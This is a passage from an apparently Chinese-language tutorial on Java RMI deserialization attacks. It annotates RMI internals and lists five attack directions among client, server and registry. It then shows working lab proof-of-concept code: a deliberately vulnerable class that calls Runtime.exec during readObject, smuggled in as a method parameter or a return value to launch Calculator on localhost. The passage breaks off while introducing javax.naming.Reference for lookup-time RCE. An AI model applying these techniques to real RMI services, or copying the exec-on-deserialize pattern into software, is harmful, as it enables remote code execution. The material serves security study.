        var8 = var2.getInputStream();
        //反序列化字符串“hello”
        //同样在反序列化客户端传来的查询数据时，这个点我们也可以利用lookup方法，理论上，我们可以在客                          户端用它去主动攻击RMI Registry，也能通过RMI Registry去被动攻击客户端
        //尽管lookup时客户端似乎只能传递String类型，但是还是那句话，只要后台不做限制，客户端的东西皆可控
        var7 = (String)var8.readObject();
然后就是客户端处理rmiregistry返回的数据时，我们已知正常情况下rmiregistry回返回一个实现了Remote的Proxy对象，但是我们也可以利用rmiregistry返回一些恶意的反序列化对象给客户端，从而进行反序列化攻击。
            //获取rmiregistry返回的输入流
            ObjectInput var4 = var2.getInputStream();
            //反序列化返回的Stub
            //同样在反序列化rmiregistry返回的Stub时这个点我们也可以利用lookup方法，理论上，我们可以在客                           户端用它去主动攻击RMI Registry，也能通过RMI Registry去被动攻击客户端
            var22 = (Remote)var4.readObject();
接下来就该客户端和服务端之间的通信了，同理客户端通过rmiregistry返回的那个Proxy对象，也就是所谓的Stub和服务端进行通信，首先服务端接受到数据以后，会对客户端传来的所需要远程方法处理的参数进行反序列化，这里又是一个可以利用的点，因为我们从客户端的角度，这个只要后台不做检验，我们就可控
            this.unmarshalCustomCallData(var41);
            //从 ConnectionInputStream里反序列化出远程调用的参数
            //这里就是客户端可以用来攻击服务端的点，因为这里对远程调用方法的参数进行了反序列化，由此我们可以传递                          恶意的反序列化数据进来
            var9 = this.unmarshalParameters(var1, var42, var7);
最后就是服务端处理完成后，将结果返回给客户端，同理，这个范围值从服务端的角度来说，也是可控的，甲乙双方可以进行互相攻击。
            //获取输入流  
            var11 = var7.getInputStream();
            //解封装参数将返回值赋值给var46,也就是把返回的结果字符串“hello”赋值给var47
            //既然将返回的参数还原了，那么其中必定包含了反序列化，由此此处可以是服务端对客户端进行反序列化攻击的                         点
          //也就是说，在这个远程调用的过程中，我们可以想办法，把参数的序列化数据替换成恶意序列化数据，我们就能攻击服务端，而服务端，也能替换其返回的序列化数据为恶意序列化数据，进而被动攻击客户端。
            Object var47 = unmarshalValue(var46, (ObjectInput)var11);
            var9 = true;
            clientRefLog.log(Log.BRIEF, "free connection (reuse = true)");
            //释放链接通道
            this.ref.getChannel().free(var6, true);
            var13 = var47;
所以总结一下有五条攻击思路
服务端------->rmiregistry
客户端------->rmiregistry
rmiregistry------->客户端
客户端------->服务端
服务端------->客户端
## 客户端攻击服务端
接下来就一个一个来试验一下，这几条攻击思路。
首先客户端(远程方法调用方)，对服务端(远程方法服务方)进行反序列化攻击，客户端对服务端进行反序列化的攻击关键在于传递的参数
那我们应该怎么来实现呢？我们来重新写一个远程方法的调用,(此处参考了知道创宇大佬的文章和代码[Java 中
RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）](https://paper.seebug.org/1091/)
，大佬的代码地址https://github.com/longofo/rmi-jndi-ldap-jrmp-jmx-jms)
首先我们先修改一下远程方法服务方的代码，为接口中唯一的一个方法添加参数，是一个Person类型。
    package com.rmitest.inter;
    import com.rmitest.impl.Person;
    import java.rmi.Remote;
    import java.rmi.RemoteException;
    public interface IHello extends Remote {
        public String sayHello(Person person)throws RemoteException;
    }
看一下这个Person类的具体细节
    package com.rmitest.impl;
    import java.io.Serializable;
    public class Person implements Serializable {
        private static final long serialVersionUID = -8482776308417450924L;
        private String name;
        public String getName() {
            return name;
        }
        public void setName(String name) {
            this.name = name;
        }
    }
就是一个简单的pojo类，然后修改HelloImpl代码实现。
    package com.rmitest.impl;
    import com.rmitest.inter.IHello;
    import java.rmi.RemoteException;
    import java.rmi.server.UnicastRemoteObject;
    public class HelloImpl extends UnicastRemoteObject implements IHello {
        public HelloImpl() throws RemoteException {
        }
        @Override
        public String sayHello(Person person) {
            System.out.println("hello"+person.getName());
            return "hello"+person.getName();
        }
    }
然后将接口文件放到Registry项目中，记得包路径要和在服务方的项目中的路径一样否则会爆ClassNotFoundException的错误，Registry项目中的IHello接口中的sayHello方法无需添加参数，因为rmiregistry在返回给客户端Stub时，这个Stub中只有对应的服务端的地址，端口号，以及objID等信息，并没有相关的参数信息。
Registry项目目录结构如下
最后客户端这边，就只需要将Person类按照和服务端一样的包路径拷贝过来，在修改下IHello里sayHell方法的参数就ok了
    package com.rmitest.customer;
    import com.rmitest.impl.Person;
    import com.rmitest.inter.IHello;
    import java.rmi.NotBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    public class RMICustomer {
        public static void main(String[] args) throws RemoteException, NotBoundException {
            IHello hello = (IHello) LocateRegistry.getRegistry("127.0.0.1", 1099).lookup("Hello");
            Person person = new Person();
            person.setName("hack");
            System.out.println(hello.sayHello(person));
        }
    }
此时一个正常的远程方法调用环境就搭建好了，按理说这种情况下是没有什么反序列化漏洞的，但是如果说服务端的项目中存在一些已知的存在问题的类，例如Apache
Common Collection。我们来模拟一下当服务端存在有存在反序列化问题的类时的情况。
    package com.rmitest.weakclass;
    import java.io.IOException;
    import java.io.ObjectInputStream;
    import java.io.Serializable;
    public class Weakness implements Serializable {
        private static final long serialVersionUID = 7439581476576889858L;
        private String param;
        public void setParam(String param) {
            this.param = param;
        }
        private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
            in.defaultReadObject();
            Runtime.getRuntime().exec(this.param);
        }
    }
这里的Weakness类只是用来模拟一个在反序列化是会进行高危操作的一个类，比起用Apache Common Collection会现显得更加直观。
同样我们客户端如果想要利用这个类来对服务端进行反序列化攻击的话，那么客户端自然也需要存在这个类。所以拷贝一份到客户端，我们之前分析源码的时候看到了，服务端会反序列化客户端传来的需要远程方法处理的参数，这就是我们的攻击点，
      this.unmarshalCustomCallData(var41);
        //从 ConnectionInputStream里反序列化出远程调用的参数
        //这里就是客户端可以用来攻击服务端的点，因为这里对远程调用方法的参数进行了反序列化，由此我们可以传递                          恶意的反序列化数据进来
        var9 = this.unmarshalParameters(var1, var42, var7);
我们根据项目的源码可以看到，这里传递的参数类型是一个Person类型，Person这个类型本身是没有问题的，那我们要怎么实现让服务端反序列化Person类时能调用Weakness类呢？
其实很简单，我们只需要将客户端这边的Weakness类修改一下就可以了，我们让Weakness继承PerSon类就可以实现这个效果了，继承了PerSon之后我们的Weakness类就是Person类型的了，这样传递的时候Weakness类就可以被当作Person类来进行传递，表面上传递的是Person类型的参数，可实际上传递的参数确是Weakness类。
    public class Weakness extends Person implements Serializable {
        private static final long serialVersionUID = 7439581476576889858L;
        private String param;
        public void setParam(String param) {
            this.param = param;
        }
        private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
            in.defaultReadObject();
            Runtime.getRuntime().exec(this.param);
        }
    }
看一下客户端这边的实现
    package com.rmitest.customer;
    import com.rmitest.inter.IHello;
    import com.rmitest.weakclass.Weakness;
    import java.rmi.NotBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    public class RMICustomer {
        public static void main(String[] args) throws RemoteException, NotBoundException {
            IHello hello = (IHello) LocateRegistry.getRegistry("127.0.0.1", 1099).lookup("Hello");
            Weakness weakness = new Weakness();
            weakness.setParam("open /Applications/Calculator.app");
            weakness.setName("hack");
            System.out.println(hello.sayHello(weakness));
        }
    }
可以看成功将Weakness类作为参数进行传递，我们之前说过，服务端在处理客户端传来的远程调用信息时，是会调用UnicastServerRef.dispatch()方法的，会反序列化其中的参数
看一下调用链即可知
    protected static Object unmarshalValue(Class var0, ObjectInput var1) throws IOException, ClassNotFoundException {
        if (var0.isPrimitive()) {
            if (var0 == Integer.TYPE) {
                return var1.readInt();
            } else if (var0 == Boolean.TYPE) {
                return var1.readBoolean();
            } else if (var0 == Byte.TYPE) {
                return var1.readByte();
            } else if (var0 == Character.TYPE) {
                return var1.readChar();
            } else if (var0 == Short.TYPE) {
                return var1.readShort();
            } else if (var0 == Long.TYPE) {
                return var1.readLong();
            } else if (var0 == Float.TYPE) {
                return var1.readFloat();
            } else if (var0 == Double.TYPE) {
                return var1.readDouble();
            } else {
                throw new Error("Unrecognized primitive type: " + var0);
            }
        } else {
          //最终在参数在 unmarshalValue 的var1.readObject()中被反序列化
            return var1.readObject();
        }
    }
至此 我们实在jdk1.7_21的版本下以客户端的身份去成功攻击了服务端。
## 服务端攻击客户端
分析完了客户端对服务端的攻击，我们来看一下
服务端对客户端的攻击，根据第二章RMI流程源码分析我们看到了，服务端如果想要攻击客户端，那么利用点就存在客户端反序列话服务端的返回值的时候。这时候需要将环境稍微修改一下。
其实很简单，先修改服务端的代码，我们将IHello接口中sayHello方法需要的参数删除，然后将返回值类型由String修改成Person类型。
    package com.rmitest.inter;
    import com.rmitest.impl.Person;
    import java.rmi.Remote;
    import java.rmi.RemoteException;
    public interface IHello extends Remote {
        public Person sayHello()throws RemoteException;
    }
HelloImpl也根据接口的要求进行修改
    package com.rmitest.impl;
    import com.rmitest.inter.IHello;
    import com.rmitest.weakclass.Weakness;
    import java.rmi.RemoteException;
    import java.rmi.server.UnicastRemoteObject;
    public class HelloImpl extends UnicastRemoteObject implements IHello {
        public HelloImpl() throws RemoteException {
        }
        @Override
        public Person sayHello() {
            Weakness weakness = new Weakness();
            weakness.setParam("open /Applications/Calculator.app");
            weakness.setName("hack");
            return weakness;
        }
    }
同客户端攻击服务端时一样，只不过这次变成了服务端这边的Weakness类需要继承Person类了。
然后客户端这边就修改完毕。
然后我们来修改rmiregistry这边的代码，同样先修改IHello接口，然后我们需要将Person类拷贝到rmiregistry这边，不过一般在生产环境中，rmiregistry和服务端一般都是在同一台机器统一个项目文件里，所以服务端可以访问的类rmiregistry同样也可以。
紧接着就是就该客户端这边的代码，同理Weakness类不再继承Person
    public class RMICustomer {
        public static void main(String[] args) throws RemoteException, NotBoundException {
            IHello hello = (IHello) LocateRegistry.getRegistry("127.0.0.1", 1099).lookup("Hello");
            Person person = hello.sayHello();
        }
    }
如此一来就可以实现通过服务端去攻击客户端
根据之前的分析客户端在远程方法的调用过程中会在UnicastRef.invoke方法中对服务端返回的数据进行反序列化，看一下调用链
如此一来服务端通过RMI攻击客户端的方式也就清晰了。
## 服务端攻击客户端 2
上一小节讲述的服务端攻击客户端的方式是通过返回值来进行操作的，这样的话利用面比较狭窄，那么有没有一种特别通用的利用方式呢？让客户端在lookup一个远程方法的时候能直接造成RCE，事实证明是有的。
这里就要讲到一个特别的类`javax.naming.Reference`，下面是该类的官方注释
    /**
      * This class represents a reference to an object that is found outside of
      * the naming/directory system.
      *
      * Reference provides a way of recording address information about
      * objects which themselves are not directly bound to the naming/directory system.
      *